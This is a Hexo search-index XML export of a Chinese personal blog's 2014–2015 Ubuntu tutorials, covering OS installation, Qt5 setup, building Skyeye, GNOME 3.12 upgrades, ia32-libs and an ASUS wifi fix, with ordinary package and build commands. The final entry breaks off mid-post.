<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>关于linux系统版本的一个分类展现</title>
    <url>/2014/07/06/blog_idx_003/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

前置说明
  本文发布于  2014-07-06 22:58:35，现用MarkDown+图床做备份更新。blog原图已从CSDN图片服务器下载。（BlogID=003）
环境说明
  无
前言

  无




linux系统版本的分类

  今天安装Codeblocks，进入下载页面时，顿时傻眼了＠。＠||。。。不知道该下载哪个？？？被迫，去查了资料
  文章参考维基百科linux词条，并经过自己总结。。。。
  下面根据软件包的打包方式进行分类进行介绍：


＠Debian 系＠
  ＠Debian GNU / Linux是一种强调使用自由软件的发行版。它支持多种硬件平台。Debian及其派生发行版使用deb软件包格式，并使用dpkg及其前端作为包管理器。
  ps:＝＝＝在这个软件包格式下就有两个著名的linux发行版本，一个是Debian,另外一个是Ubuntu。当然，基于这个软件打包格式的系统还有很多，我们了解就行了。。。
  ps:对于这个name.deb。我们使用的安装软件的命令为：sudo dpkg -i name.deb


＠Red Hat系＠
  @Red Hat Linux和SUSE Linux是最早使用RPM格式软件包的发行版，如今RPM格式已广泛运用于众多的发行版。这两种发行版后来都分为商业版本和社区支持版本。Red Hat Linux的社区支持版本现称为Fedora，商业版本则称为Red Hat Enterprise Linux。
  ps:＝＝＝在这个软件包格式下就有两个著名的linux发行版本,一个是fedora（这个为以前的Red Hat linux的替代）,一个是Red Hat Enterprise Linux
  ps:对于这个name.rpm。我们使用的安装软件的命令为：sudo rpm -i name.rpm


＠其他系＠
  @其他软件打包方式等等




后记

  ＃PS 现在各位在下载某些开源软件的时候，不怕不知道选择什么格式的软件包了吧 ＠.＠
  ＃PS各位请不喜勿喷。。。。。。
参考文献
  无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
      </categories>
      <tags>
        <tag>开源软件</tag>
        <tag>下载</tag>
        <tag>选择</tag>
      </tags>
  </entry>
  <entry>
    <title>关于Ubuntu的磁盘空间不足其中的一种问题</title>
    <url>/2014/07/06/blog_idx_002/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

前置说明
  本文发布于 2014-07-06 01:12:48，现用MarkDown+图床做备份更新。blog原图已从CSDN图片服务器下载。（BlogID=002）
环境说明
  使用的是Ｕｂｕｎｔｕ14.04 x64
前言

  ------  更新于Thu May 13 19:02:30 CST 2021




注意：以下的图片是我修好之后的图片，只是说明我是怎样解决问题的。。。

  1 博主我最近使用Ｕｂｕｎｔｕ时，经常出现一个大问题。那就是磁盘写入量特别的大，达到了90多ＭＢ/s（我在这里看的数据）

    
        
        
    
  
  而且，硬盘灯一直狂闪。 
  我使用磁盘使用分析器(命令：sudo baobab)：看了一下文件分布。。。下图 

    
        
    
  
  2 在这里，你可以看到哪个文件的容量比较大，经比较，我发现/var/log/cups文件特别的大，删除后error_log等文件后，还是迅速增加这些文件，经查询发现，可能是ｃｕｐｓ服务捣鬼，到这里，有两个方法：


＠彻底删除ｌｏｇ文件（简单，粗暴，但是不能够查看各种log 文件）


＠停止ｃｕｐｓ服务,命令：sudo update-rc.d cups remove


  就这样，我的硬盘灯就不在狂闪了。。。。。。









    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Ubuntu使用</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>硬盘</tag>
        <tag>数据</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 14.04傻瓜式安装 0@0</title>
    <url>/2014/07/03/blog_idx_001/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

前置说明
  本文发布于 2014-07-03 20:45:27，现用MarkDown+图床做备份更新。blog原图已从CSDN图片服务器下载。（BlogID=001）
环境说明
  本教程使用ubuntu14.04 x64在虚拟机中安装，实际个人情况  请注意个人问题的不同。
前言

  本文是梦想开始的地方，是我的第一篇正式blog。  ------  更新于Thu Aug 27 18:09:03 CST 2020




按照步骤操作安装Ubuntu14.04

  整个步骤流程为下载镜像，然后引导，最后配置安装。
  1 去http://www.ubuntu.com/download/下载自己需要的Ubuntu版本。
  2 使用各种方法加载ISO文件到达下图。  各种方法：虚拟机加载，制作U盘启动盘。
  3 然后按照后续图片步骤操作即可。

    
        
        图一 为选择安装语言
    
  

    
        
        图二 为选择安装的基础选项，不要选择安装中下载更新，会导致安装很慢，选不选安装第三方软件，自己决定
    
  

    
        
        图三 为安装方式选项，在我们自己安装时，最好选择其他选项，由自己的兴趣定制安装方式
    
  

    
        
        图四:
    
  
（谨慎）图四是配置安装空间，这是在虚拟机中安装的，相当于新的电脑（硬盘没有分区）安装系统，当系统安装了其他系统或分区后，显示界面不同，但是你要选择一个分区移除已有分区（点减号），然后可以继续往下

    
        
        图五 是在空闲硬盘上建立一个分区，容量 随意，新分区类型最好和我一样，其余的必须和我一样
    
  

    
        
        图六 是建立一个交换数据的分区，这个必须存在，容量的选择：如果内存》2G，就一个G就够了，小于，最好是内存的两倍
    
  

    
        
        图七：
    
  
注意（谨慎）：选择引导器时，如果原先已有系统存在，请 小白们，就选择/dev/sda/ ext4 /这个选项，不要去覆盖已有的系统引导，不然，导致原来的系统不能够使用

    
        
        图八：尽量选择中国内的，为后面系统时间，键盘探测 提供便利
    
  

    
        
        图九 继续
    
  

    
        
        图10 记住密码必须设定来自己记得
    
  




现在要做的事就是等待。。。


    
        
    
  




重启安装成功


    
        
    
  









    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Ubuntu使用</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>系统安装</tag>
        <tag>傻瓜式</tag>
      </tags>
  </entry>
  <entry>
    <title>关于编写GUI程序我自己的一些理解</title>
    <url>/2014/10/12/blog_idx_006/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

前置说明
  本文发布于  2014-10-12 14:51:31，现用MarkDown+图床做备份更新。blog原图已从CSDN图片服务器下载。（BlogID=006）
环境说明
  系统：ubuntu x64 ， qt5， qt5 creator
前言

  背景：LZ我最近在Ubuntu上使用C &amp; C++ &amp; QT做一个项目， 其他多的我都不说了。单单是说一下我对那个GUI的开发问题.




说明

  引题：看到网上说，那么多的人觉得做一个图形界面程序是多么多么的难，然而，做一个控制台的程序是多么的简单。今天，我就来反对一下这种我认为是错误的认识。
  首先：我们做一个项目的时候，要完成它，我们就必须写相应的程序，并且可以实现相应的功能，这样，我们这个项目就可以算是完成了。(这个是大家都公认的流程的一部分)
  现在：我们要用图形界面来做相同的一个程序，是不是很多人看到这个目标就头大了！！！
  其实不然，我觉得只要在控制台下，你实现了你想要的功能的话，那么在编写图形化时候就是非常EASY的！！！
  举个例子：

    
        
    
   
  #@#@#：这个是一个界面的一部分的截图。
  这里就举一个输入的例子，在c或者c++中，scanf和cin可以在控制台获取输入的数据，而在这个图形化界面中，在框中输入数据，后台使用跟这个框有关的函数可以接受数据，接到数据后，这个后面的流程和控制台程序一样。
  这就是一个功能从控制台到GUI的转变，其他的任何功能就可以，照着相同的原理进行转换移植
  同时：
  现在的图形库，有的提供了GUI设计软件，大部分界面是通过鼠标画出来的，大量的属性都可以直接设置。这时，你就会发现，图形化界面的程序和你原来控制台的程序差别几乎没有，只有展现数据和动作的方式有所变化，GUI中更加的友好。
  画图的的界面：

    
        
    
   
  这个是可以直接用鼠标拖入的。。。
  编程只是为了美好的明天。。。。。。。。。 @（0.0）@




后记

  无
参考文献
  无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>linux开发</category>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>C++</tag>
        <tag>GUI</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu 14.04 x86_64编译安装Skyeye1.3.5RC1的心得</title>
    <url>/2014/11/09/blog_idx_007/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

前置说明
  本文发布于  2014-11-09 09:19:03，现用MarkDown+图床做备份更新。blog原图已从CSDN图片服务器下载。（BlogID=007）
环境说明
  实验环境：Ubuntu 14.04 X86_64
  编译包：Skyeye1.3.5_RC1.tar.bz2
前言

  PS:由于学习ＡＲＭ的需要，而且钱不足，所以只能够使用模拟器，经查询：发现skyeye是很强大的一个模拟器，所以开始了我的折腾之旅．




编译安装Skyeye

  本文不会过多的介绍编译安装的命令，主要讲讲我编译时遇到的问题和解决方案
  下载地址：http://sourceforge.net/projects/skyeye/files/skyeye/skyeye-1.3.5/
  下载截图：

    
        
    
    


第一步：编译安装：
  由于这个软件需要很多的依赖，所以开始就安装好
sudo apt-get install libgtk2.0-dev pkg-config libatk1.0-dev libpango1.0-devlibfreetype6-dev libglib2.0-dev libx11-dev binutils-dev
  进入下载目录:
  如果编译时不出问题，则使用下面的命令后，就代表安装成功，但是下面的命令一次性成功的概率非常低
tar -xjf tarballname.tar.bz2

cd tarballname

./autogen.sh &amp;&amp; automake

./configure

make lib

make

sudo make install_lib

sudo make
  在我的系统环境下，我主要遇到这几个问题：
  １．make 时，出现…/llvm/…/DataTypes.h找不到的问题
  我去看了skyeye－maillist后，得到感悟：
  在出现…/llvm/…头文件找不到，按照官方的说法，skyeye1.3.5所支持的llvm包只能够为３．０的版本：
  所以必须安装llvm3.0.tar.gz包，就可以解决以上的一类问题
  出现这种错误：

    
        
    
    
  出现这种错误的原因是ｌｌｖｍ３．０包里面的ｌｌｖｍ－ｃｏｎｆｉｇ没有放到正确的地方，只需要把llvm-config
  放到/usr/local/bin 或者/usr/bin(放到哪里要根据错误提示)
  ２．ｍａｋｅ时，遇到 编译sdl 出现  _XDATA32 已经定义的问题

    
        
    
    
  我查看了google后，发现，这是一个sdl包的ｂｕｇ，并不是安装错误.
  在sdl源代码文件夹下，修改：/src/video/x11/SDL_x11sym.h

    
        
    
    
//在图片所圈的位置删除一行

SDL_X11_SYM(int,_XData32,(Display *dpy,register long *data,unsigned len),(dpy,data,len),return)　

//在图片所圈的位置添加一行

SDL_X11_SYM(int,_XData32,(Display *dpy,register _Xconst long *data,unsigned len),(dpy,data,len),return)
  ３ ． 遇到这个问题：

    
        
    
    
  这个是由于ｐｙｔｈｏｎ的没有安装好：
  我使用源代码安装ｐｙｔｈｏｎ２．７．３
./configure –enable-shared –enable-unicode=ucs4

sudo make

sudo make install
  最后就可以成功的使用skyeye

    
        
    
    

    
        
    
 


第二步：配置环境变量
  vim /home/user_name/.bashrc
  在最后加入一行：exportPATH=/opt/skyeye/bin:$PATH
  更新环境变量:source /home/user_name/.bashrc
  这样就可以在命令提示行中的任意地方使用skyeye命令




后记

  无
参考文献
  无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>linux</tag>
        <tag>嵌入式</tag>
        <tag>ARM</tag>
        <tag>Skyeye</tag>
      </tags>
  </entry>
  <entry>
    <title>关于linux在笔记本下耗电的解决方案（只写我实践的部分）</title>
    <url>/2014/09/22/blog_idx_005/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

前置说明
  本文发布于  2014-09-22 12:02:54，现用MarkDown+图床做备份更新。blog原图已从CSDN图片服务器下载。（BlogID=005）
环境说明
  ps：我的系统为：Ubuntu amd64bit
前言

  无




说明

  首先我关于系统耗电的原因总结：


由于部分系统内核版本问题，导致对 cpu的管理出现漏洞


由于部分系统中的服务”频繁“使用IO


由于部分笔记本带有独显，而现在的部分Linux版本对双显卡支持不好，导致双显卡一直工作，从而导致耗电量大曾。


  下面是我对这个几个问题的解决办法：


1 . 关于CPU的最简单的(我自己认为)解决方法：
  安装CPU frequency scaling indicator
  安装方法：
  http://packages.ubuntu.com/precise/indicator-cpufreq下载

    
        
    
    
  进入你下载的目录：
sudo tar -zxvf name.tar.gz

cd name

sudo ./configure

sudo make

sudo make install
  注意：name ＝ 实际你的软件源码包的名称
  安装完成后的效果：

    
        
    
    


２ 对于系统中某些程序频繁使用ＩＯ可以使用这个软件查看
  System Load Indicator：
  命令：
sudo add-apt-repository ppa:indicator-multiload/stable-daily

sudo apt-get update

sudo apt-get install indicator-multiload
  安装完成后的效果：

    
        
    
    
  当你发现ＣＰＵ Ｍｅｍ ｉｏｗａｉｔ ｄｉｓｋ ｌｏａｄ 参数异常时，你可以去管理你的进程（这里不详述），这样你就可以关闭你的耗电的且你不使用的程序


３ 关于笔记本的双显卡问题
  这里以Ｎ卡为例（其他的独显都是一个原理）
  首先在你的系统设置里面找到：ｓｏｆｔｗａｒｅ＆ｕｐｄａｔｅ进去
  切换到以下选项卡

    
        
    
    
  安装对应你的显卡驱动，重启
  在你对图像要求一般的时候
  按ｓｕｐｅｒ 键：搜索ｎｖｉｄｉａ ｘ ｓｅｒｖｅｒｓ ｓｅｔｔｉｎｇ
  打开后找 ｐｒｉｍｅ ｐｒｏｆｉｌｅｓ自行设置关闭独显
  下图是设置好的时候，进入ｎｖｉｄｉａ ｘ ｓｅｒｖｅｒｓ ｓｅｔｔｉｎｇ的主界面

    
        
    
    
  这样，你的笔记本至少不会短快




后记

  无
参考文献
  无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Ubuntu使用</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>linux</tag>
        <tag>省电</tag>
        <tag>显卡</tag>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title>在Ubuntu14.04上安装qt5和qtcreator的 两种方式（源代码和xxxxx.run） 和我的感悟-------超级详细版</title>
    <url>/2014/07/25/blog_idx_004/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

前置说明
  本文发布于  2014-07-25 12:21:13，现用MarkDown+图床做备份更新。blog原图已从CSDN图片服务器下载。（BlogID=004）
环境说明
  无
前言

  #PS：由于学习的需要，我开始在Ubuntu上安装qt环境
  #PS：我的系统为Ubuntu14.04 x64




《《《下载安装qt5》》》

  让我们开始吧！！！


天才第一步：
  下载源代码 或者 直接安装的XXXXX.RUN软件，下载地址：http://qt-project.org/downloads,打开界面如下：

    
        
    
    
  @图一为打开的下载页面
  要有更多的下载选项，看下图：

    
        
    
    


天才第二步：
  注意，到了上面的步骤，我们就要开始做出选择，如果不想折腾，请选择xxxxx.run文件下载安装，如果想折腾，请选择源代码下载，结果如下图：

    
        
    
    
  @图三是 下载xxxxx.run

    
        
    
   
  @图四是关于源代码下载


天才第三步：安装qt5
  在使用下面的命令之前，请安装这个文件：


----------------------------------------------------&gt;&gt;sudo apt-get install build-essential


----------------------------------------------------&gt;&gt;sudo apt-get install build-essential debian-keyring freeglut3-dev


  如果下载了图三的文件。。。请使用下面的命令


----------------------------------------------------&gt;&gt;cd 文件存放目录


----------------------------------------------------&gt;&gt;sudo chmod 777 文件名称


----------------------------------------------------&gt;&gt;sudo ./xxxxx.run


  注意：图三文件的安装方法我参照网上，请自行测试
  如果下载了图四的文件。。。请使用下面的命令


----------------------------------------------------&gt;&gt;cd 文件存放目录


----------------------------------------------------&gt;&gt;tar -zxvf 文件名称.tar.gz


----------------------------------------------------&gt;&gt;sudo chmod 777 解压后的文件名称


----------------------------------------------------&gt;&gt;cd 解压后的文件名称


----------------------------------------------------&gt;&gt;sudo ./configure


  注意：这里有两处要自己选择，第一处选择o，第二处选择yes
  ps：上面的选择，只要懂点点英文就知道啦！！！


----------------------------------------------------&gt;&gt;sudo make


  注意：运行了上面的那条命令后，《《用时非常的长《《，如果需要，请注意：你可以去吃饭睡觉打豆豆了。。。


----------------------------------------------------&gt;&gt;sudo make install


  运行了上面的命令后，便是安装好了，接下来要配置环境变量


----------------------------------------------------&gt;&gt;sudo gedit /etc/profile


  在打开的文件中，请在最后添加下面的文字：
export QTDIR=QT安装目录的绝对路径

export PATH=$QTDIR/bin:$PATH

export MANPATH=$QTDIR/man:$MANPATH

export LD_LIBRARY_PATH=$QTDIR/lib:$LD_LIBRARY_PATH
  好了，现在配置好了
  在命令行窗口运行：qmake -v
  出现了下面的图片相似的样子，就是配置好了

    
        
    
   


-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  华丽的分割线
××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
下面开始配置qtcreator
  第一步：下载文件，同上，有两种文件

    
        
    
    
  @请自行下载自己适合的。。。。。。。。
  第二步：开始安装
  同样有两样方式，请参照qt5安装选择一下两种方式:
  &lt;&lt;第一种&lt;&lt;


----------------------------------------------------&gt;&gt;cd 文件存放目录


----------------------------------------------------&gt;&gt;sudo chmod 777 文件名称


----------------------------------------------------&gt;&gt;sudo ./xxxxx.run


  &lt;&lt;第二种&lt;&lt;


----------------------------------------------------&gt;&gt;cd 文件存放目录


----------------------------------------------------&gt;&gt;tar -zxvf 文件名称.tar.gz


----------------------------------------------------&gt;&gt;sudo chmod 777 解压后的文件名称


----------------------------------------------------&gt;&gt;cd 解压后的文件名称


----------------------------------------------------&gt;&gt;sudo qmake -r


----------------------------------------------------&gt;&gt;sudo make


  注意：运行了上面的那条命令后，《《用时很长《《，如果需要，请注意：你可以去吃饭睡觉打豆豆了。。。


----------------------------------------------------&gt;&gt;sudo make install


  最后配置软件：
  在命令行：输入:qtcreator

    
        
    
    
  然后请打开这个：

    
        
    
   
  打开后是这样的：

    
        
    
   
  #图七中：
  注意：自己设置下图的几个选项，自动检测出来有的，就不用管了。。。。。

    
        
    
  
  注意：如果没有自动检测出，请手动设置所需文件的路径
  最后，可以写一个文件，运行试试。。下面是我的效果图；

    
        
    
  
&emsp;&emsp;OK啦。。。现在可以享受QT的了




后记

  感悟：qt5和qt4变化不大。。。基本的东西都可以兼容。。。但是，《《某些东西要改《《，不然你会头痛。。。。
参考文献
无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Ubuntu使用</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>开源软件</tag>
        <tag>Ubuntu</tag>
        <tag>qtcreator</tag>
        <tag>qt5</tag>
        <tag>源代码</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 14.04 升级到Gnome3.12z的折腾之旅(警示后来者)+推荐Extensions.-------(二)</title>
    <url>/2014/12/22/blog_idx_010/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

前置说明
  本文发布于  2014-12-22 15:33:35，现用MarkDown+图床做备份更新。blog原图已从CSDN图片服务器下载。（BlogID=010）
  文章日期:2014.12.22
环境说明
  系统:ubuntu14.04 x64
  笔记本:华硕x550vc
前言

  无




----------------&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;接上一篇:

  注意:
  如果gnome3.12出问题了,你可以随时恢复
  从GNOME 3.12 降至3.10版本(需要长时间等待,下载文件)
sudo apt-get install ppa-purge

sudo ppa-purge ppa:gnome3-team/gnome3-staging
  接下来谈谈gnome3.12的extension问题
  首先进入网站:https://extensions.gnome.org/ (最好使用firefox进入,googlechrome不支持在线安装)

    
        
    
  
  下面是我分享的插件:
  第一个:MMOD-panel:可以调整其他插件的设置

    
        
    
  
  第二个:system-monitor:系统监视

    
        
    
  
  第三个:places-status:一个按钮可以打开特定的文件

    
        
    
  
  第四个:dash to dock:和ubuntu-dock类似

    
        
    
  
  第五个:Media-player-indicator:在电源分组中,和unity桌面播放音乐时效果相似

    
        
    
  
  第六个:taskbar:实现桌面底部显示真正运行的程序,类似window任务栏

    
        
    
  
  第七个:hibernate-status-bottom:休眠按钮,关机键旁边




后记

  无
参考文献
  无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Ubuntu使用</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>GUI</tag>
        <tag>gnome</tag>
        <tag>extension</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu 14.04 x64 安装ia32-libs(时间点为2015.1.2)</title>
    <url>/2015/01/02/blog_idx_011/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

前置说明
  本文发布于  2015-01-02 22:45:12，现用MarkDown+图床做备份更新。blog原图已从CSDN图片服务器下载。（BlogID=011）
环境说明
  系统:ubuntu14.04 x64
  测试时间:2015.1.2
前言

  无




开启32位支持

  解释:由于时间的推移,网上流传的关于安装ia32-libs的方法失效(包括使用13.10的源等等)
  使用下面的命令:
  这是我写的脚本命令:
#!/bin/sh
sudo dpkg --add-architecture i386
sudo apt-get update
#开启多架构支持


cd /etc/apt/sources.list.d
echo "deb http://old-releases.ubuntu.com/ubuntu raring main restricted universe multiverse" > ia32-libs-raring.list
sudo apt-get update
sudo apt-get install ia32-libs
sudo rm ia32-libs-raring.list
sudo apt-get update
#在旧的ubuntu源中安装ia32-libs
  脚本下载地址:http://download.csdn.net/detail/u011728480/8321431
  执行脚本命令:
cd xxxxx(脚本所在的目录)

sudo sh xxx.sh




后记

  无
参考文献
  无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Ubuntu使用</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>linux</tag>
        <tag>脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>修复华硕笔记本fn+f2在ubuntu下wifi不能够正常使用和WiFi Disabled (Hard-blocked) (译文)</title>
    <url>/2014/12/22/blog_idx_009/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

前置说明
  本文发布于  2014-12-22 11:49:16，现用MarkDown+图床做备份更新。blog原图已从CSDN图片服务器下载。（BlogID=009）
  文章日期:2014.12.19
  注意，本文是一篇译文
环境说明
  系统:ubuntu14.04 x64
  笔记本:华硕x550vc
前言

  问题状况:每次打开ubuntu时,wifi不能够使用,提示wifi通过硬件模块关闭.
  以前的方案:可以通过休眠系统,然后启动,就可以使用wifi,但是重启,或者关机之后打开,wifi又会出现刚才的状况




国外大神解决方案

  国外大神提供的解决方案:
  原文地址:http://ubuntuforums.org/showthread.php?t=2181558
  原文作者如果认为侵权:请联系我,我马上删除,谢谢
  第一步:检查驱动是可用的
lspci -nnk | grep -A2 0280

    
        
    
    
  检查你的最后一行,&quot;Kernel driver in use:xxx&quot;例如:(e.g. “Kernel driver in use: ath9k”)
  第二步:检查是否有asus_nb_wmi 这个驱动
lsmod | grep -e ath9k -e asus
  注意:如果没有asus_nb_wmi 这个驱动,我不保证下面方法有效性
  第三步:替换wifi模块的驱动
echo "options asus_nb_wmi wapf=4" | sudo tee /etc/modprobe.d/asus_nb_wmi.conf
  解释:这个命令是在/ect/modprobe.d/目录下创建asus_nb_wmi.conf文件,使其在下一次启动系统时用wapf= 4参数加载asus_nb_wmi驱动
  第四步:重启系统
  这是你就可以使用你的networkmanager使用你的wifi
  可以正常打开了:

    
        
    
    




后记

  无
参考文献


http://ubuntuforums.org/showthread.php?t=2181558







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Ubuntu使用</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>笔记本</tag>
        <tag>华硕</tag>
        <tag>wifi</tag>
        <tag>解决方案</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 14.04 升级到Gnome3.12z的折腾之旅(警示后来者)+推荐Extensions.-------(一)</title>
    <url>/2014/12/19/blog_idx_008/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

前置说明
  本文发布于  2014-12-19 22:40:20，现用MarkDown+图床做备份更新。blog原图已从CSDN图片服务器下载。（BlogID=008）
  文章日期:2014.12.19
环境说明
  系统环境:Ubuntu 14.04 X86_64
前言

  起因:由于ubuntu 的unity桌面用着太难受,开始在网上搜索好的桌面环境.看到了如gnome,kde等等不错的桌面.于是我选择了gnome.我也开启了我的折腾之旅.




折腾

  由于系统为14.04lts, 在其源列表中包含了gnome3.10的的安装包.于是便开启了我的折腾.
  刚开始,我在synaptic中安装好了gnome3.10,重启之后,改变桌面,登陆gnome感觉很不错.但是用着用着我就发现了一个问题,那就是有线链接的图标没有,只有wifi的图标,就算网络链接上了之后,也没有了有线网络图标.

    
        
    
    
  于是我便开始找啊找啊.最后发现了一个让我特别无语的关于有线网络图标的说明:
  百度一个回复(没有验证是不是这样的原因)

    
        
    
   
  这个时候,我已经感觉到了系统的不太稳定.但是我不知道原因,我以为是gnome3.10的问题,但是我查询资料后,发现gnome3.10是很稳定的,不会出现大的波动.于是,我有开始纳闷.
  继续前面.我一直想着怎么恢复有线网络图标,于是间接触了gnome Extensions.(https://extensions.gnome.org/)

    
        
    
   
  从这里,我可以看到,有许多外国的大神,开发了许多插件,可以让gnome更加的人性化,到这里,我就想能不能够找到一个插件可以恢复有线网络图标.但是不知道是不是我没有发现插件,还是我没有发现其他的特别方法可以让它恢复有线网络图标,于是乎我绝望了.
  但是,在找网络图标的过程中.我发现了许多不错的插件,这也为我后面配置整个桌面环境提供了巨大的帮助.
  就这样过了许久…
  突然间,我发现了,现在最新的gnome版本是3.14,于是我去看了看3.14的特性,果然没有让我失望,有线网络图标恢复了.
  于是我就想,我升级到3.14,但是,我想到估计3.14不太稳定,于是,我就找了3.10到3.14之间的,可以在ubuntu14.04上使用的gnome稳定版本.最后发现了3.12版本,现在有许多的教程.我就简单的总结一下.


安装gnome3.12教程
  首先,我们必须安装好gnome3.10,这个原因我也不清楚,但是网上说必须先安装3.10.于是我便直接使用了前面的成果.
  然后:
sudo add-apt-repository ppa:gnome3-team/gnome3-staging
sudo apt-get update
sudo apt-get dist-upgrade
  注意:最后一步是需要大量时间的.除非网速非常好.
  此外,在这里之后,我找到了我的系统经常崩溃的原因,那就是许多unity下的程序在gnome3下不兼容,所以,必须更新你的整个系统,如果可以,最好还是把unity桌面卸载掉(慎用),
  这样的原因有二,避免重复更新和减小系统体积,主要还是前者,我们要避开兼容错误,最好把unity桌面卸载了.
  卸载之后:
  注意:不要马上关机,请保证你的gnome的桌面环境安装完毕,也就
  是sudo apt-get dist-upgrade必须执行(在你卸载完毕unity桌面后).
  下面即是新桌面的特性:

    
        
    
   

    
        
    
   

    
        
    
   

    
        
    
   

    
        
    
   




后记

  无
参考文献
  无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Ubuntu使用</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>linux</tag>
        <tag>桌面</tag>
      </tags>
  </entry>
  <entry>
    <title>undefined reference to vtable for &quot;xxx::xxx&quot; in QT（已解决）</title>
    <url>/2015/02/09/blog_idx_012/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
